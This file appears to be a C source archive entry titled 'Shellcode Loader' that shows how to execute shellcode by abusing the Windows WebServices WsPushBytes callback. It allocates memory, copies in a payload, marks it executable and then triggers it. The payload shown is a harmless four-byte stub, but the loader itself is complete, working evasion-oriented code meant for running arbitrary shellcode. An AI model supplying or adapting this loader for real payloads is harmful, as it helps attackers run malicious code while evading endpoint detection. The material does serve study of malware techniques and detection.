/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  WsPushBytes
*/

#include <windows.h>
#include <stdint.h>
#include <WebServices.h>

#pragma comment(lib,"WebServices")

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    WS_XML_WRITER                 * writer = NULL;
    WS_XML_WRITER_BUFFER_OUTPUT     outs;
    WS_XML_WRITER_TEXT_ENCODING     encoding;
    WS_XML_WRITER_MTOM_ENCODING     mtom;
    WS_STRING   boundary    = WS_STRING_VALUE(L"revid");
    WS_STRING   startinfo   = WS_STRING_VALUE(L"startinfo");
    WS_STRING   starturi    = WS_STRING_VALUE(L"http://reversing.id");

    WS_XML_STRING   elem_data = WS_XML_STRING_VALUE("data");
    WS_XML_STRING   elem_byte = WS_XML_STRING_VALUE("bytes");
    WS_XML_STRING   empty_ns  = WS_XML_STRING_VALUE("");

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // prepare writer for creating dummy XML
        ZeroMemory (&outs, sizeof(WS_XML_WRITER_BUFFER_OUTPUT));
        outs.output.outputType = WS_XML_WRITER_OUTPUT_TYPE_BUFFER;

        ZeroMemory (&encoding, sizeof(WS_XML_WRITER_TEXT_ENCODING));
        encoding.encoding.encodingType = WS_XML_WRITER_ENCODING_TYPE_TEXT;
        encoding.charSet = WS_CHARSET_UTF8;

        ZeroMemory(&mtom, sizeof(WS_XML_WRITER_MTOM_ENCODING));
        mtom.encoding.encodingType = WS_XML_WRITER_ENCODING_TYPE_MTOM;
        mtom.textEncoding = &encoding.encoding;
        mtom.writeMimeHeader = TRUE;
        mtom.boundary = boundary;
        mtom.startInfo = startinfo;
        mtom.startUri = starturi;
        mtom.maxInlineByteCount = 18;

        // trigger by creating XML
        WsCreateWriter (NULL, 0, &writer, NULL);
        WsSetOutput(writer, &mtom.encoding, &outs.output, NULL, 0, NULL);
        WsWriteStartElement(writer, NULL, &elem_data, &empty_ns, NULL);
        WsWriteStartElement(writer, NULL, &elem_byte, &empty_ns, NULL);
        WsPushBytes (writer, (WS_PUSH_BYTES_CALLBACK)runtime, NULL, NULL);
        WsWriteEndElement (writer, NULL);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}